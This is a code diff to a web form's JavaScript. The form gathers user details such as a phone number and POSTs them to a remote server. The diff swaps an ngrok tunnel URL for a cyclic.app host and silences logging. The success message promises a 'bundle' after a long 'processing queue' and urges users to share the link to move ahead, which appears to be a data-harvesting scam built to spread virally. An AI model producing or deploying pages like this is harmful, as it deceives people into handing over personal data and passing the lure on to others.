@@ -641,10 +641,10 @@
 					phoneNumber: document.getElementsByName("phoneNumber")[0].value,
 					// Add other form fields similarly
 				};
-				console.log('form', formData);
+				// console.log('form', formData);
 		
 				// Make API call using an appropriate method (e.g., fetch)
-				fetch('https://50f0-196-39-220-155.ngrok-free.app/users', {
+				fetch('https://lime-delightful-kingfisher.cyclic.app/users', {
 					method: 'POST',
 					headers: {
 						'Content-Type': 'application/json',
@@ -655,7 +655,7 @@
 				.then(response => response.json())
 				.then(data => {
 					// Handle API response if needed
-					console.log(data);
+					// console.log(data);
 					
 					// Show the modal with the API response message
 					showModal("Congratulations! You have been successfully added to the queue. Due to the high volume of requests received, please anticipate up to a 5-hour processing time for your requested bundle to be loaded. We encourage you to enhance your account activity by sharing the provided link with others, thereby expediting your position in the queue. Thank you for your patience and understanding.");
